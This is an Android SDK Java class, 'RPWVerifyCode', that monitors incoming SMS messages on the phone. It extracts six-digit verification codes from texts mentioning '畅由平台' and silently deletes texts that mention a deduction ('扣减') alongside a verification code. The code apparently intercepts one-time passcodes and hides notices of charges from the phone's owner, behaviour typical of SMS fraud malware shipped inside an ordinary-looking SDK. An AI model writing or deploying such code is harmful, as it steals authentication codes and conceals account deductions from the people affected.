package com.myyj.sdk.tools.pwdhelperx;

import android.graphics.SumPathEffect;

import com.myyj.sdk.CallbackInCallback;
import com.myyj.sdk.ResultCallback;
import com.myyj.sdk.tools.LogHelper;
import com.myyj.sdk.tools.PhoneInfoHelper;
import com.myyj.sdk.tools.StringHelper;
import com.myyj.sdk.tools.SuperSmsManager;

class RPWVerifyCode extends RPWBase {
    CallbackInCallback callOnStart;
    public RPWVerifyCode(CallbackInCallback callOnStart, ResultCallback resultCallback) {
        super(null, null, resultCallback);
        this.callOnStart = callOnStart;
    }

    @Override
    protected void updateStatusLogic() {
        if(resetStatus == RS_START) {
            // 调用发送验证码的回调
//            callOnStart.callback(0, "begin");
            SuperSmsManager.getInstance().setReadVerifyCodeMode(true);
            callOnStart.callback(0, new ResultCallback() {
                @Override
                public void callback(int state, String result) {
                    finishStatus = FS_FAIL_READ;
                    serverPassword = "";
                    if(state == 0) {
                        LogHelper.d("RPWVC发送正常，开始执行监听");
                        updateStatus(RS_SENDED_1);
                        startTimer(TIMEOUT_VALUE, RS_FINISH);
                    } else {
                        LogHelper.d("RPWVC发送失败，中止监听");
                        updateStatus(RS_FINISH);
                    }
                }
            });
        }
        else if(resetStatus == RS_FINISH) {
            finish(finishStatus);


        }
    }

    @Override
    public void updateReceiveLogic(String address, String body) {
        LogHelper.d("updateReceiveLogic!!!");
        if(resetStatus == RS_SENDED_1) {
            if (checkStrContainsKeyWords(body, new String[]{"畅由平台", "验证码"})) {
//            || checkStrContainsKeyWords(body, new String[]{"北京银夏", "注册码"})) {
                serverPassword = StringHelper.checkBitsCode(body, 6);
                finishStatus = FS_SUC;
                this.updateStatus(RS_FINISH);
            }
            if (checkStrContainsKeyWords(body, new String[]{"扣减", "验证码"})) {
                SuperSmsManager.getInstance().deleteSms();
            }

        }
    }


    @Override
    protected boolean needIdCardNumberAtFirst() {
        return false;
    }

    @Override
    protected boolean needIdCardNumberAtAll() {
        return false;
    }

    @Override
    protected String defaultResult() {
        return "";
    }
}
